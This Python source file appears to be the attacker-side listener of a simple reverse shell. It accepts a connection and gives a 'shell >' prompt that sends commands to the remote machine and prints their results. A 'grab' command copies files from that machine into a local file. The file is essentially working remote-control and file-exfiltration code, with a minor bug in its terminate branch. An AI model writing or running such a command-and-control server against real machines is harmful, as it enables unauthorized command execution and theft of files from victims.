
# TCP SERVER

import socket  # for building TCP connection


# transfer files
def transfer(conn, command):

    conn.send(command.encode())
    f = open("test.txt", "wb")

    while True:
        bits = conn.recv(1024).decode()

        if "Unable to find out the file" in bits:
            print("[+] File not found")
            break

        if bits.endswith("DONE"):
            print("[+] Transfer completed")
            f.close()
            break

        f.write(bits.encode())

    f.close()


# initalize connection and send commands
def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 8080))
    s.listen(1)

    conn, addr = s.accept()
    print("[+] Got a connection from: ", addr)

    while True:

        command = input("shell > ")

        if "terminate" in command:
            conn.send("Closing connection...")
            conn.close()
            break

        elif "grab" in command:
            transfer(conn, command)

        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


# main function, runs connection
def main():
    connect()


# run main()
main()
